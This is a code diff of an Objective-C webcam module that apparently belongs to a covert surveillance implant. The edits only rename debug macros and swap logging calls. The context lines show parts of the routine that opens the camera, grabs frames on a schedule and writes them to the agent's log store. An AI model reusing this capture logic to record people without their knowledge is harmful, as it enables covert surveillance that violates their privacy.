@@ -13,7 +13,10 @@
 #import "RCSMAgentWebcam.h"
 #import "RCSMConfManager.h"
 
-//#define DEBUG
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
+
+
 #define BREAK_AND_FREE(x) {if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP) \
                           {if(x != nil) [(NSAutoreleasePool *)x release];break;}}
 
@@ -44,7 +47,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
   
   if (![mDevice open: &error]) 
     {
-#ifdef DEBUG
+#ifdef DEBUG_WEBCAM
       if (error != nil)
         NSLog(@"initSession: device open - %@", [error localizedDescription]);
       else
@@ -54,7 +57,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
       return NO;
     }
   
-#ifdef DEBUG
+#ifdef DEBUG_WEBCAM
   if ([mDevice isOpen] == YES)
     NSLog(@"initSession: device is open");
   else
@@ -68,7 +71,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
       if (![mCaptureSession addInput: mCaptureDeviceInput
                                error: &error]) 
         {
-#ifdef DEBUG
+#ifdef DEBUG_WEBCAM
       if(error != nil ) 
         NSLog(@"initSession: adding input device - %@", [error localizedDescription]);
       else
@@ -86,7 +89,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
       if (![mCaptureSession addOutput: mCaptureDecompressedVideoOutput
                                 error: &error]) 
         {
-#ifdef DEBUG
+#ifdef DEBUG_WEBCAM
         if(error != nil )
           NSLog(@"initSession: adding video output - %@", [error localizedDescription]);
         else
@@ -134,7 +137,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
 - (BOOL)_startGrabImageWithFrame: (int)nFrame
                            every: (int)seconds
 {
-#ifdef DEBUG
+#ifdef DEBUG_WEBCAM
   NSLog(@"startGrabImageWithFrame");
 #endif
   
@@ -161,13 +164,13 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
                                                 properties: nil];    
       NSMutableData *dataImage = [[NSMutableData alloc] initWithData: dataBitmap];
       
-#ifdef DEBUG_VERBOSE_1
+#ifdef DEBUG_WEBCAM
       time_t uTime;
       time(&uTime);
       
       NSString *image_filename = [NSString stringWithFormat: @"/tmp/webcam-%.16X.jpg", uTime];
       [dataImage writeToFile: image_filename atomically: NO];
-      NSLog(@"startGrabImageWitFrame: frame %d grabbed! frame ptr = 0x%x", i, mCurrentImageBuffer);
+      verboseLog(@"startGrabImageWitFrame: frame %d grabbed! frame ptr = 0x%x", i, mCurrentImageBuffer);
 #endif
       
       RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
@@ -181,7 +184,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
                                 forAgent: AGENT_CAM
                                withLogID: 0] == TRUE)
             {
-#ifdef DEBUG
+#ifdef DEBUG_WEBCAM
               NSLog(@"data written correctly");
 #endif
             }
@@ -214,7 +217,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
   if ([self _stopSession] == NO) 
     return NO;
   
-#ifdef DEBUG
+#ifdef DEBUG_WEBCAM
   NSLog(@"startGrabImageWitFrame: frames grabbing done!");
 #endif
   
@@ -334,7 +337,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-#ifdef DEBUG
+#ifdef DEBUG_WEBCAM
   NSLog(@"Agent web started");
 #endif
   
@@ -353,14 +356,14 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
       if ([self _startGrabImageWithFrame: wcRawData->numOfFrame
                                    every: wcRawData->sleepTime] == YES)
         {
-#ifdef DEBUG
+#ifdef DEBUG_WEBCAM
           NSLog(@"Webcam grabbing done!");
 #endif
         }
       else
         {
-#ifdef DEBUG
-          NSLog(@"An error occurred while grabbing from webcam");
+#ifdef DEBUG_WEBCAM
+          errorLog(@"An error occurred while grabbing from webcam");
 #endif
         }
       
